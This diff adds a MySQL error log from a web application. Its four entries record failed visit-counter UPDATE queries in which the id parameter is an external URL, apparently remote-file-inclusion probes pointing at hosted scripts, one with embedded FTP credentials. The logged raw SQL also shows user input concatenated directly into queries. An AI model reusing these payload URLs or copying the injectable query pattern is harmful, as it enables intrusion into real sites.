@@ -1,0 +1,15 @@
+Time : 05:31:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://www.lojaformosa.com.br/fonts/tst.txt?' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=http://www.lojaformosa.com.br/fonts/tst.txt?
+
+Time : 05:31:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://www.lojaformosa.com.br/fonts/tst.txt?' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=http://www.lojaformosa.com.br/fonts/tst.txt?
+
+Time : 03:22:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://abies:abies@www.abies.tarnow.net.pl/www/s.php?' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=ftp://abies:abies@www.abies.tarnow.net.pl/www/s.php?
+
+Time : 02:08:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://abies:abies@www.abies.tarnow.net.pl/www/s.php?' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=ftp://abies:abies@www.abies.tarnow.net.pl/www/s.php?
